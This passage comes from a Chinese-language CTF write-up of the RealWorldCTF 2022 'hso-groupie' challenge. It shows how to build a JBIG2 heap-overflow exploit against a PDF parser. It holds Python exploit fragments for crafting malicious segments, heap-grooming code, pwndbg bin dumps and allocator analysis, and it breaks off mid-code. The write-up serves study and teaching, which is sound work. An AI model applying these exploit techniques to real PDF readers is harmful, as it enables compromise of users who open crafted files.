<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> git@github.com:agl/jbig2enc.git</span><br></pre></td></tr></table></figure>
<p>但是，该库是使用 C++ 编写的，若 exploit 也全部使用 C++ 完成，则工作量较高。因此，我们可以使用 pybind11 来暴露 jbig2enc 中的部分接口给 python，这样编写 exploit 时可以使用 python 语言来完成。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install pybind11-dev</span><br></pre></td></tr></table></figure>
<p>最后需要注意的是，由于 <code>jbig2enc</code> 的接口会<strong>使用到大量的指针</strong>，而<strong>将指针暴露给 python 接口调用</strong>是一个非常不明智的选择（因为如果让 python 来调用需要指针的接口，则会降低开发速度和<strong>提高触发 bug 的几率</strong>），因此我们最好根据当前的需求，即：</p>
<blockquote>
<p><strong>将 bitmap 数据以 JArithmeticDecoder 方式来进行编码</strong>。</p>
</blockquote>
<p>来额外编写一个 wrapper C++ 代码，实现三个封装好的结构体/枚举：</p>
<ul>
<li><code>ArithEncoder</code>：调用 jbig2enc 对 bitmap 进行编码的类</li>
<li><code>Bitmap</code>：待被编码的 bitmap 数据</li>
<li><code>ArithEncoder::Proc</code>：<code>ArithEncoder</code> 编码器的状态枚举</li>
</ul>
<p>最后将这三个结构体/枚举 暴露给 python 调用，避免让 python 直接操作指针。</p>
<blockquote>
<p>这一小节所实现的代码，正对应于 exp 中的以下几个文件：</p>
<ul>
<li><code>hso-groupie/exploit/jbig2arith.[cc,h]</code></li>
<li><code>hso-groupie/exploit/jbjbarith.[cc,h]</code></li>
</ul>
</blockquote>
<h4 id="b-encode-segments">b. encode segments</h4>
<p>hso 在 read segments 时，首先会读取出每个当前 segment 的 段号 segNum、segFlags、refFlags 等一系列字段和标志，之后才是进行（可能的） bitmap 读取。</p>
<p>这些字段和标志同样是需要我们手动放进 JBIG2Stream 中。由于这里的字段和标志不需要使用解码器进行解码，因此可以手动编写代码将字段一个个放置进流中。</p>
<p>这一步的操作位于 exp 中的 <code>hso-groupie/exploit/jbig2.py</code> ，该脚本为所有用到的 segment 都编写了一个对应的 <strong>python 结构转 JBIG2Stream 字节流</strong>的操作；同时，上一节中暴露给 python 所调用的 bitmap encoder 接口，也是在该脚本中所使用。</p>
<p>这样，当我们使用 python 设计好一个个特定的 segments 后，我们便可以将这些 segments 快速转换成 JBIG2Stream 流数据，方便快捷。</p>
<h2 id="五、漏洞利用流程">五、漏洞利用流程</h2>
<h3 id="1-堆风水">1. 堆风水</h3>
<h4 id="a-创建堆空洞">a. 创建堆空洞</h4>
<p>先放上这张镇楼图：</p>
<p><img src="/2022/02/rwctf2022_hso/a.jpg" alt="img"></p>
<p>为了利用这个堆溢出漏洞，我们需要充分发动堆风水，将指定的结构放至对应的堆块。这里，我们的堆风水需要完成以下几个目标：</p>
<ul>
<li>
<p>让 pdf 在解析 TextRegionSeg 时，其创建的 syms 指针数组位于 <code>undersized syms buffer</code> 处</p>
</li>
<li>
<p>让内含<strong>存放超多指针的 JBIG2SymbolDict 结构体</strong>的 segment 放置在 <code>segments GList backing buffer</code> 处</p>
<blockquote>
<p>这里，我们打算让 JBIG2SymbolDict 结构体存放至 <strong>global segment</strong> 中，因为 SymbolDictSegment 不依赖与任何的 Segments，但是后续的 TextRegionSegment 会依赖这些 SymbolDictSegment。</p>
</blockquote>
</li>
<li>
<p>让 pageBitmap 结构体占据图中 <code>JBIG2Bitmap</code> 那块内存，并让其 data 占据图中上面 <code>bitmap backing buffer</code> 那块内存。</p>
<blockquote>
<p>通读代码，我们可以得知绝大多数 segments 在解析时，都可以让其 bitmap 与 pageBitmap 进行运算，并将结果保存在 pageBitmap 上。因此让 pageBitmap 拥有越界读写的能力是最好的选择。</p>
</blockquote>
</li>
</ul>
<p>我们先尝试在 global segment 中分配三个不同 Bitmap 大小的 SymbolDict 出来。这里分配不同大小的 SymbolDict 是为了后续在 TextRegionSeg 中，排列组合 size 至溢出，因此这三个堆块的位置<strong>不需要关心</strong>：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># global segment</span></span><br><span class="line">global_file = [</span><br><span class="line">    SymbolDict(<span class="number">0</span>, [Bitmap(<span class="number">1</span>, <span class="number">1</span>)] * <span class="number">0x10000</span>),</span><br><span class="line">    SymbolDict(<span class="number">1</span>, [Bitmap(<span class="number">1</span>, <span class="number">1</span>)] * (size_to_overflow // <span class="number">8</span>)),</span><br><span class="line">    SymbolDict(<span class="number">2</span>, [Bitmap(<span class="number">1</span>, <span class="number">1</span>)]),</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<blockquote>
<p>其中 <code>size_to_overflow</code> 为上图中 <code>overflow</code> 的字节数，具体计算过程稍后介绍。</p>
</blockquote>
<p>此时我们看看分配完这三个 SymbolDict 后的 bins 是什么情况，可以看到<strong>有大量的碎片堆块</strong>：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> bins</span></span><br><span class="line">tcachebins</span><br><span class="line">0x20 [  4]: 0x55555579f8e0 —▸ 0x5555557b9550 —▸ 0x5555557b0c10 —▸ 0x5555557b0c60 ◂— 0x0</span><br><span class="line">0x30 [  5]: 0x5555557ab330 —▸ 0x5555557b0c30 —▸ 0x5555557b0c80 —▸ 0x555555799280 —▸ 0x5555557992d0 ◂— 0x0</span><br><span class="line">0x40 [  7]: 0x5555557f7f90 —▸ 0x5555557f8f10 —▸ 0x5555557f9100 —▸ 0x5555557f7bb0 —▸ 0x5555557fe710 —▸ 0x5555557a0320 —▸ 0x555555797210 ◂— 0x0</span><br><span class="line">0x50 [  1]: 0x5555557a02b0 ◂— 0x0</span><br><span class="line">0x60 [  4]: 0x5555557ab3c0 —▸ 0x5555557a9e40 —▸ 0x5555557ab890 —▸ 0x5555557ab790 ◂— 0x0</span><br><span class="line">0x70 [  1]: 0x5555557ac760 ◂— 0x0</span><br><span class="line">0x90 [  1]: 0x5555557b94c0 ◂— 0x0</span><br><span class="line">0xa0 [  3]: 0x555555798e00 —▸ 0x5555557b6930 —▸ 0x5555557b6a10 ◂— 0x0</span><br><span class="line">0xb0 [  2]: 0x5555557ba520 —▸ 0x5555557b9410 ◂— 0x0</span><br><span class="line">0xc0 [  3]: 0x5555557bec00 —▸ 0x5555557bf620 —▸ 0x5555557b1220 ◂— 0x0</span><br><span class="line">0xd0 [  5]: 0x555555799ec0 —▸ 0x5555557b0cb0 —▸ 0x5555557c5400 —▸ 0x5555557c37f0 —▸ 0x5555557bfcf0 ◂— 0x0</span><br><span class="line">0xe0 [  3]: 0x5555557be4b0 —▸ 0x5555557a9a30 —▸ 0x5555557bc750 ◂— 0x0</span><br><span class="line">0xf0 [  3]: 0x5555557c6d30 —▸ 0x5555557bd370 —▸ 0x5555557bd4a0 ◂— 0x0</span><br><span class="line">0x100 [  2]: 0x5555557c4360 —▸ 0x5555557c44a0 ◂— 0x0</span><br><span class="line">0x110 [  1]: 0x555555797100 ◂— 0x0</span><br><span class="line">0x120 [  2]: 0x5555557c1000 —▸ 0x5555557c5880 ◂— 0x0</span><br><span class="line">0x140 [  3]: 0x5555557c7c80 —▸ 0x5555557c7430 —▸ 0x5555557cc180 ◂— 0x0</span><br><span class="line">0x150 [  3]: 0x5555557cdac0 —▸ 0x5555557c83f0 —▸ 0x5555557c8590 ◂— 0x0</span><br><span class="line">0x160 [  2]: 0x55555579fc00 —▸ 0x5555557a4420 ◂— 0x0</span><br><span class="line">0x170 [  3]: 0x555555797c20 —▸ 0x5555557d36c0 —▸ 0x5555557d3550 ◂— 0x0</span><br><span class="line">0x180 [  2]: 0x5555557bff50 —▸ 0x5555557d8010 ◂— 0x0</span><br><span class="line">0x190 [  7]: 0x5555557adb80 —▸ 0x5555557d8530 —▸ 0x5555557ad570 —▸ 0x5555557ac7d0 —▸ 0x5555557a8710 —▸ 0x5555557a8d60 —▸ 0x5555557aad00 ◂— 0x0</span><br><span class="line">0x1a0 [  2]: 0x5555557d2890 —▸ 0x5555557ad700 ◂— 0x0</span><br><span class="line">0x1b0 [  2]: 0x5555557a8ef0 —▸ 0x5555557aea50 ◂— 0x0</span><br><span class="line">0x1c0 [  2]: 0x5555557d1bb0 —▸ 0x55555579ad70 ◂— 0x0</span><br><span class="line">0x1d0 [  2]: 0x555555796b00 —▸ 0x555555796640 ◂— 0x0</span><br><span class="line">0x1f0 [  2]: 0x5555557a6410 —▸ 0x5555557a6220 ◂— 0x0</span><br><span class="line">0x200 [  2]: 0x55555576a670 —▸ 0x5555557aae90 ◂— 0x0</span><br><span class="line">0x220 [  2]: 0x5555557d8310 —▸ 0x5555557ac960 ◂— 0x0</span><br><span class="line">0x230 [  1]: 0x5555557bd980 ◂— 0x0</span><br><span class="line">0x270 [  1]: 0x5555557ba6d0 ◂— 0x0</span><br><span class="line">0x2b0 [  1]: 0x5555557abdc0 ◂— 0x0</span><br><span class="line">0x2c0 [  1]: 0x555555798320 ◂— 0x0</span><br><span class="line">0x2e0 [  1]: 0x5555557aa730 ◂— 0x0</span><br><span class="line">0x300 [  2]: 0x5555557a5c60 —▸ 0x5555557a9590 ◂— 0x0</span><br><span class="line">0x310 [  7]: 0x5555557ae510 —▸ 0x5555557ac110 —▸ 0x5555557ad010 —▸ 0x5555557abab0 —▸ 0x5555557a9280 —▸ 0x5555557aa420 —▸ 0x5555557a76c0 ◂— 0x0</span><br><span class="line">0x320 [  3]: 0x555555799f90 —▸ 0x5555557becc0 —▸ 0x5555557bab30 ◂— 0x0</span><br><span class="line">0x350 [  2]: 0x5555557bcb40 —▸ 0x5555557c3bd0 ◂— 0x0</span><br><span class="line">0x390 [  1]: 0x5555557a88a0 ◂— 0x0</span><br><span class="line">0x3b0 [  2]: 0x555555797250 —▸ 0x5555557a79d0 ◂— 0x0</span><br><span class="line">0x3c0 [  1]: 0x5555557d39d0 ◂— 0x0</span><br><span class="line">0x3d0 [  1]: 0x5555557cccc0 ◂— 0x0</span><br><span class="line">0x400 [  1]: 0x55555576aa50 ◂— 0x0</span><br><span class="line">0x410 [  3]: 0x555555797810 —▸ 0x5555557bf1d0 —▸ 0x5555557a7f90 ◂— 0x0</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x5555558304b0 —▸ 0x7ffff7ad8c00 (main_arena+96) ◂— 0x5555558304b0</span><br><span class="line">smallbins</span><br><span class="line">0x20: 0x5555557a99e0 —▸ 0x7ffff7ad8c10 (main_arena+112) ◂— 0x5555557a99e0</span><br><span class="line">0xb0: 0x5555557f82f0 —▸ 0x7ffff7ad8ca0 (main_arena+256) ◂— 0x5555557f82f0</span><br><span class="line">0xf0: 0x5555557d0ab0 —▸ 0x7ffff7ad8ce0 (main_arena+320) ◂— 0x5555557d0ab0</span><br><span class="line">0x120: 0x5555557992f0 —▸ 0x7ffff7ad8d10 (main_arena+368) ◂— 0x5555557992f0</span><br><span class="line">0x190: 0x5555557f7df0 —▸ 0x5555557f8d70 —▸ 0x5555557f8f60 —▸ 0x5555557f7a10 —▸ 0x5555557fe570 ◂— ...</span><br><span class="line">0x1c0 [corrupted]</span><br><span class="line">FD: 0x5555557f1a30 —▸ 0x5555557f4780 —▸ 0x5555557d15f0 —▸ 0x5555557e49d0 —▸ 0x55555579ecf0 ◂— ...</span><br><span class="line">BK: 0x5555557d0c90 —▸ 0x5555557d06f0 —▸ 0x5555557d1410 —▸ 0x5555557d0e70 —▸ 0x55555579e390 ◂— ...</span><br><span class="line">0x1d0 [corrupted]</span><br><span class="line">FD: 0x5555557f9910 —▸ 0x5555557f9720 —▸ 0x5555557f85b0 —▸ 0x5555557fe960 —▸ 0x5555557f66b0 ◂— ...</span><br><span class="line">BK: 0x5555557f9530 —▸ 0x5555557f9150 —▸ 0x5555557fb050 —▸ 0x5555557fdd90 —▸ 0x5555557fd1e0 ◂— ...</span><br><span class="line">0x1e0 [corrupted]</span><br><span class="line">FD: 0x5555557a13c0 —▸ 0x5555557a0bc0 —▸ 0x5555557a11c0 —▸ 0x5555557a0570 —▸ 0x5555557a0770 ◂— ...</span><br><span class="line">BK: 0x5555557fcbf0 —▸ 0x5555557fc9f0 —▸ 0x5555557fdb90 —▸ 0x5555557fe760 —▸ 0x5555557fc210 ◂— ...</span><br><span class="line">0x1f0: 0x5555557ba930 —▸ 0x5555557f1120 —▸ 0x5555557d19b0 —▸ 0x5555557befd0 —▸ 0x7ffff7ad8de0 (main_arena+576) ◂— ...</span><br><span class="line">0x200: 0x5555557a9b00 —▸ 0x5555557df570 —▸ 0x5555557a8500 —▸ 0x7ffff7ad8df0 (main_arena+592) ◂— 0x5555557a9b00</span><br><span class="line">0x220 [corrupted]</span><br><span class="line">FD: 0x5555557f3c20 —▸ 0x5555557ecce0 —▸ 0x5555557e8180 —▸ 0x5555557f57f0 —▸ 0x5555557ee5a0 ◂— ...</span><br><span class="line">BK: 0x5555557f4540 —▸ 0x5555557f2130 —▸ 0x5555557f27e0 —▸ 0x5555557eec60 —▸ 0x5555557f2ea0 ◂— ...</span><br><span class="line">0x230 [corrupted]</span><br><span class="line">FD: 0x5555557ae810 —▸ 0x5555557f49d0 —▸ 0x5555557e2710 —▸ 0x5555557f4c20 —▸ 0x5555557a0970 ◂— ...</span><br><span class="line">BK: 0x5555557f0a20 —▸ 0x5555557a23a0 —▸ 0x5555557e5a20 —▸ 0x5555557a3d20 —▸ 0x5555557a3f70 ◂— ...</span><br><span class="line">0x240 [corrupted]</span><br><span class="line">FD: 0x5555557f5590 —▸ 0x5555557f1330 —▸ 0x5555557e3730 —▸ 0x5555557f4e70 —▸ 0x5555557a1ef0 ◂— ...</span><br><span class="line">BK: 0x5555557ec840 —▸ 0x5555557f50d0 —▸ 0x5555557a4660 —▸ 0x5555557e4090 —▸ 0x5555557f5330 ◂— ...</span><br><span class="line">0x250: 0x55555579a760 —▸ 0x7ffff7ad8e40 (main_arena+672) ◂— 0x55555579a760</span><br><span class="line">0x270 [corrupted]</span><br><span class="line">FD: 0x5555557dd3a0 —▸ 0x5555557e1a10 —▸ 0x5555557e0810 —▸ 0x5555557e02e0 —▸ 0x5555557e0aa0 ◂— ...</span><br><span class="line">BK: 0x5555557a54a0 —▸ 0x5555557a5210 —▸ 0x5555557e1f40 —▸ 0x5555557e0aa0 —▸ 0x5555557e02e0 ◂— ...</span><br><span class="line">0x280 [corrupted]</span><br><span class="line">FD: 0x5555557c7560 —▸ 0x5555557b0d70 —▸ 0x5555557e0570 —▸ 0x5555557df2d0 —▸ 0x5555557df810 ◂— ...</span><br><span class="line">BK: 0x5555557e21d0 —▸ 0x5555557deaf0 —▸ 0x5555557df030 —▸ 0x5555557e2470 —▸ 0x5555557ded90 ◂— ...</span><br><span class="line">0x290: 0x5555557acb70 —▸ 0x5555557ddb10 —▸ 0x5555557e0030 —▸ 0x5555557e1760 —▸ 0x5555557de5a0 ◂— ...</span><br><span class="line">0x2a0: 0x5555557dfd70 —▸ 0x5555557dfab0 —▸ 0x7ffff7ad8e90 (main_arena+752) ◂— 0x5555557dfd70</span><br><span class="line">0x2c0: 0x5555557a5f50 —▸ 0x5555557f5c90 —▸ 0x7ffff7ad8eb0 (main_arena+784) ◂— 0x5555557a5f50 /* 'P_zUUU' */</span><br><span class="line">0x340: 0x5555557f5f70 —▸ 0x5555557ac410 —▸ 0x7ffff7ad8f30 (main_arena+912) ◂— 0x5555557f5f70</span><br><span class="line">0x380: 0x5555557c69a0 —▸ 0x7ffff7ad8f70 (main_arena+976) ◂— 0x5555557c69a0</span><br><span class="line">0x390: 0x5555557d7c70 —▸ 0x7ffff7ad8f80 (main_arena+992) ◂— 0x5555557d7c70 /* 'p|&#125;UUU' */</span><br><span class="line">0x3b0: 0x5555557c54c0 —▸ 0x7ffff7ad8fa0 (main_arena+1024) ◂— 0x5555557c54c0</span><br><span class="line">0x3f0: 0x5555557bd580 —▸ 0x7ffff7ad8fe0 (main_arena+1088) ◂— 0x5555557bd580</span><br><span class="line">largebins</span><br><span class="line">0x580: 0x5555557cc2b0 —▸ 0x555555797d80 —▸ 0x7ffff7ad9050 (main_arena+1200) ◂— 0x5555557cc2b0</span><br><span class="line">0x600: 0x5555557c7db0 —▸ 0x7ffff7ad9070 (main_arena+1232) ◂— 0x5555557c7db0</span><br><span class="line">0x640: 0x5555557be580 —▸ 0x7ffff7ad9080 (main_arena+1248) ◂— 0x5555557be580</span><br><span class="line">0x780: 0x5555557ea9f0 —▸ 0x5555557cb9e0 —▸ 0x7ffff7ad90d0 (main_arena+1328) ◂— 0x5555557ea9f0</span><br><span class="line">0x800: 0x5555557985d0 —▸ 0x7ffff7ad90f0 (main_arena+1360) ◂— 0x5555557985d0</span><br><span class="line">0x840: 0x5555557cdc00 —▸ 0x7ffff7ad9100 (main_arena+1376) ◂— 0x5555557cdc00</span><br><span class="line">0x900: 0x5555557bdba0 —▸ 0x7ffff7ad9130 (main_arena+1424) ◂— 0x5555557bdba0</span><br><span class="line">0x940: 0x5555557e77f0 —▸ 0x5555557e9b00 —▸ 0x7ffff7ad9140 (main_arena+1440) ◂— 0x5555557e77f0</span><br><span class="line">0x980: 0x5555557d86b0 —▸ 0x5555557ebea0 —▸ 0x7ffff7ad9150 (main_arena+1456) ◂— 0x5555557d86b0</span><br><span class="line">0x9c0: 0x555555795c40 —▸ 0x7ffff7ad9160 (main_arena+1472) ◂— 0x555555795c40 /* '@\\yUUU' */</span><br><span class="line">0xa00: 0x5555557cd080 —▸ 0x7ffff7ad9170 (main_arena+1488) ◂— 0x5555557cd080</span><br><span class="line">0xa40: 0x555555799440 —▸ 0x5555557d1e40 —▸ 0x7ffff7ad9180 (main_arena+1504) ◂— 0x555555799440</span><br><span class="line">0xac0: 0x5555557e83c0 —▸ 0x5555557e6100 —▸ 0x7ffff7ad91a0 (main_arena+1536) ◂— 0x5555557e83c0</span><br><span class="line">0xb00: 0x5555557d2a20 —▸ 0x7ffff7ad91b0 (main_arena+1552) ◂— 0x5555557d2a20 /* ' *&#125;UUU' */</span><br><span class="line">0xb40: 0x5555557e6c70 —▸ 0x5555557feb50 —▸ 0x7ffff7ad91c0 (main_arena+1568) ◂— 0x5555557e6c70 /* 'pl~UUU' */</span><br><span class="line">0xc40: 0x5555557eb210 —▸ 0x5555557e8ea0 —▸ 0x7ffff7ad9200 (main_arena+1632) ◂— 0x5555557eb210</span><br><span class="line">0xe00: 0x5555557c00c0 —▸ 0x5555557b9630 —▸ 0x5555557c4590 —▸ 0x7ffff7ad9210 (main_arena+1648) ◂— 0x5555557c00c0</span><br><span class="line">0x1400: 0x5555557b5420 —▸ 0x7ffff7ad9240 (main_arena+1696) ◂— 0x5555557b5420 /* ' T&#123;UUU' */</span><br><span class="line">0x1600: 0x5555557ce770 —▸ 0x7ffff7ad9250 (main_arena+1712) ◂— 0x5555557ce770</span><br><span class="line">0x1800: 0x5555557bae40 —▸ 0x7ffff7ad9260 (main_arena+1728) ◂— 0x5555557bae40</span><br><span class="line">0x2600: 0x5555557b6aa0 —▸ 0x5555557c1110 —▸ 0x7ffff7ad92d0 (main_arena+1840) ◂— 0x5555557b6aa0</span><br><span class="line">0x2a00: 0x55555579af20 —▸ 0x7ffff7ad92f0 (main_arena+1872) ◂— 0x55555579af20</span><br><span class="line">0x3000: 0x5555557d3d80 —▸ 0x5555557d9b60 —▸ 0x5555557c88a0 —▸ 0x7ffff7ad9300 (main_arena+1888) ◂— 0x5555557d3d80</span><br></pre></td></tr></table></figure>
<p>这些碎片堆块对于接下来的堆风水是相当不利的，因此需要将其全部分配掉。这里使用的是 <code>PageInfoSeg</code> 来分配内存，因为通读代码可以发现 <code>JBIG2Stream::readPageInfoSeg</code> 函数<strong>除了分配一个堆块以外，没有产生其他任何影响</strong>：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DummyAlloc</span><span class="params">(size)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> PageInfo(<span class="number">233</span>, w=<span class="number">8</span>, h=size)</span><br><span class="line"></span><br><span class="line">global_file = [</span><br><span class="line">    SymbolDict(<span class="number">0</span>, [Bitmap(<span class="number">1</span>, <span class="number">1</span>)] * <span class="number">0x10000</span>),</span><br><span class="line">    SymbolDict(<span class="number">1</span>, [Bitmap(<span class="number">1</span>, <span class="number">1</span>)] * (size_to_overflow // <span class="number">8</span>)),</span><br><span class="line">    SymbolDict(<span class="number">2</span>, [Bitmap(<span class="number">1</span>, <span class="number">1</span>)]),</span><br><span class="line">    <span class="comment"># Heap grooming: eat every chunk in &#123;tcache,fast,small,large,unsorted&#125; bins</span></span><br><span class="line">    [[DummyAlloc(size)] * <span class="number">128</span> <span class="keyword">for</span> size <span class="keyword">in</span> range(<span class="number">0x10</span>, <span class="number">0x1000</span>, <span class="number">0x10</span>)],</span><br><span class="line">    [[DummyAlloc(size)] * <span class="number">16</span> <span class="keyword">for</span> size <span class="keyword">in</span> range(<span class="number">0x1000</span>, <span class="number">0x10000</span>, <span class="number">0x100</span>)],</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<p>分配后的 bin 如下所示，可以看到清爽了不少：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> bins</span></span><br><span class="line">tcachebins</span><br><span class="line">empty</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">0x20 [corrupted]</span><br><span class="line">FD: 0x55555579d9f0 —▸ 0x5555557d2860 —▸ 0x555555798db0 —▸ 0x5555557d7fe0 —▸ 0x5555557d7c30 ◂— ...</span><br><span class="line">BK: 0x5555557f96e0 —▸ 0x5555557f9300 —▸ 0x5555557fb200 —▸ 0x5555557fdf40 —▸ 0x5555557fd390 ◂— ...</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>
<p>那么接下来的问题是，如何设计堆风水？exploit 给了一个清晰明了的做法：</p>
<blockquote>
<p>利用 global segment GList <strong>满则扩增</strong>的特性创建堆空洞，进而让其他结构体来占据这些内存空洞，完成堆风水。</p>
</blockquote>
<p>什么意思呢？我们看看 GList 的一些类方法：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">GList::GList() &#123;</span><br><span class="line">  size = <span class="number">8</span>;</span><br><span class="line">  data = (<span class="keyword">void</span> **)gmallocn(size, <span class="keyword">sizeof</span>(<span class="keyword">void</span>*));</span><br><span class="line">  length = <span class="number">0</span>;</span><br><span class="line">  inc = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">GList::append</span><span class="params">(<span class="keyword">void</span> *p)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (length &gt;= size) &#123;</span><br><span class="line">    expand();</span><br><span class="line">  &#125;</span><br><span class="line">  data[length++] = p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">GList::expand</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  size += (inc &gt; <span class="number">0</span>) ? inc : size;</span><br><span class="line">  data = (<span class="keyword">void</span> **)greallocn(data, size, <span class="keyword">sizeof</span>(<span class="keyword">void</span>*));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到，初始时 <strong>GList size 为 8</strong>。当 GList 中元素个数超过容量时，GList 容量将会<strong>双倍扩增</strong>。也就是说，初始时的 size 为 8，下次扩增后的 size 是 16，再下次扩增后的 size 为 32，再下下次的 size 为 64（单位，个指针）。</p>
<p>扩增所使用的堆函数为 <code>realloc</code>，即当 GList 容量扩增后，原先那个堆块<strong>将被释放</strong>。同时又因为上面已经将其余全部小堆块全都分配出去了，因此 <strong>GList 容量扩增所分配的新堆块，一定来自于 top chunk</strong>，这就能保证每次 GList 容量扩张时，<strong>新堆块的分配顺序一定是从低地址向高地址分配</strong>。</p>
<p>因此尝试让 global segment GList 多次扩展，从 8 扩展至我们所需要的最终大小 64：</p>
<blockquote>
<p>代码中的 glist_capacity == 32。个人认为这个数表示的是<strong>第几次 append global GList 时会扩充 GList size 至 64</strong>。</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">global_file = [</span><br><span class="line">    SymbolDict(<span class="number">0</span>, [Bitmap(<span class="number">1</span>, <span class="number">1</span>)] * <span class="number">0x10000</span>),</span><br><span class="line">    SymbolDict(<span class="number">1</span>, [Bitmap(<span class="number">1</span>, <span class="number">1</span>)] * (size_to_overflow // <span class="number">8</span>)),</span><br><span class="line">    SymbolDict(<span class="number">2</span>, [Bitmap(<span class="number">1</span>, <span class="number">1</span>)]),</span><br><span class="line">    <span class="comment"># 